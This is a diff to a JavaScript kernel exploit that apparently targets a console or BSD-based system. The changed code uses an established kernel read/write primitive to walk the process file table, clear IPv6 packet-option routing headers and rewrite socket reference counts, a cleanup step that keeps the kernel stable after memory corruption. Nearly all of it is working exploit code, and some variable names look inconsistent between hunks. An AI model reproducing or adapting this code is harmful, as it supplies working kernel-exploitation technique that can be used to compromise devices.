@@ -1486,44 +1486,35 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
    var SO_PCB        = 0x18;
   var  INPCB_PKTOPTS = 0x118;
  
- function readPtr(base, offset) {
-  return kmem.readp(base.add(offset));
+function get_fd_data_addr(fd) {
+  const filep = kmem.read64(ofiles + BigInt(fd) * BigInt(SIZEOF_OFILES));
+  return kmem.read64(filep);
 }
-
-    function getFdSocket(fd) {
-  
-  const base = kmem.readp(ofiles);              // Addr ofiles (base pointer)
-  const slot = base.add(fd * SIZEOF_OFILES);    // &ofiles[fd]
-  const filep = readPtr(slot, 0);               // struct file*
-  return readPtr(filep, 0);                     // struct socket*
-}
-
-
-
-    function getSockPktopts(fd) {
-  const sock = getFdSocket(fd);                     // Addr socket*
-  const pcb  = readPtr(sock, SO_PCB);               // Addr inpcb*
-  return readPtr(pcb, INPCB_PKTOPTS);               // Addr ip6_pktopts*
+ 
+function get_sock_pktopts(fd) {
+  const sock_data = get_fd_data_addr(fd);
+  const pcb       = kmem.read64(sock_data + BigInt(SO_PCB));
+  return kmem.read64(pcb + BigInt(INPCB_PKTOPTS));
 }
 
     
  try{
 
- for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
-  const pkto = getSockPktopts(sd);
-  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
+     for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
+  const pkto = get_sock_pktopts(sd);             // BigInt ptr a pktopts
+  kmem.write64(pkto + off_ip6po_rthdr, 0n);       // azzera rthdr
 }
-
-     const refs = [
+     const sock_increase_ref = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
-  main_sd,
-  worker_sd,
-  reclaim_sd,
+  master_sock,
+  worker_sock,
+  reclaim_sock,
 ];
-for (let sd of refs) {
-  const sockAddr = getFdSocket(sd);
-  kmem.write32(sockAddr, 0x100);
+
+for (let sd of sock_increase_ref) {
+  const sock_addr = get_fd_data_addr(sd);        // BigInt ptr a socket
+  kmem.write32(sock_addr, 0x100);                // incrementa so_count
 }
      
     log("full restore of pktopts and sock refcounts complete");
